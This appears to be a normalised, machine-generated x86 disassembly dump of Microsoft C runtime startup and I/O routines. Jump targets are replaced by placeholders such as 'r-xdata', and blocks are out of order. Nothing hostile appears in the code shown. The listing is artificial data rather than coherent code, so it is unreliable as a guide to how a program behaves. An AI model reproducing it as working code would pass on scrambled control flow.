push 0x314
mov edi rw-data
push edi
call sub_40cdee
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_408640
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_405882
push esi
call sub_40cdd3
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_40cdee
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_40cc91
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_40cdd3
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_40cd06
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_40cc91
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_40cb25
add esp 0xc
jmp r-xdata
sub_4099ab
push 0x3
call sub_40ce51
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_4097fc
push 0xff
call sub_4097fc
pop ecx
pop ecx
push 0x3
call sub_40ce51
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_4099e4
mov edi edi
push ebp
mov ebp esp
push esi
call sub_406b17
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_409b2e
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_40bad2
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_40cee3
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_409b8d
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_40bad2
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_407e9e
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_408640
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_408640
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_405655
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_407e9e
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_405655
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_4049b3
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_405882
int3
add edi 0x4
sub_409c69
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_40cee3
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_40cee3
pop ecx
test eax eax
je r-xdata
call sub_40cee3
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_409e03
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_40bad2
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_409c69
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_407e59
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_409c69
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_409ebe
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_407e59
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_405655
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_409f56
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_407e9e
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_407e9e
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_40a19b
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40a1c1
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40a205
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_40a3b3
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_40a4b9
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_40a4b9
pop ecx
sub_40a4d0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_40cefb
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_40a54a
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_40a594
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_405655
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_40a602
push 0xc
push r--data
call sub_4082b0
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_4099ab
push 0x1e
call sub_4097fc
push 0xff
call sub_407fe8
push 0x18
call sub_407e59
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_40a6c4
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_405926
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_4082f5
retn
push edi
call sub_405655
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_405655
pop ecx
call sub_405926
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a6bb
mov eax [ ebp - 0x1c ]
sub_40a6c4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_40a602
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_40828a
sub_40a700
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_40a790
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_40d445
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_40d464
jmp r-xdata
sub_40a790
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_40568f
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_40a700
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40a7f2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_40a822
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40a852
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_40d4ed
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_405926
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_40594c
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_40a8d7
push 0x14
push r--data
call sub_4082b0
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_405939
and [ eax ] 0x0
call sub_405926
mov [ eax ] 0x9
call sub_405939
and [ eax ] 0x0
call sub_405926
mov [ eax ] 0x9
call sub_4058d4
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_4082f5
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_40d556
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405926
mov [ eax ] 0x9
call sub_405939
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a852
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a9b7
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_40a9c1
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_40d660
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_405939
mov [ eax ] edi
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40568f
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_405939
and [ eax ] 0x0
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
jmp r-xdata
push esi
call sub_40b1db
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_40a852
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_406b90
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
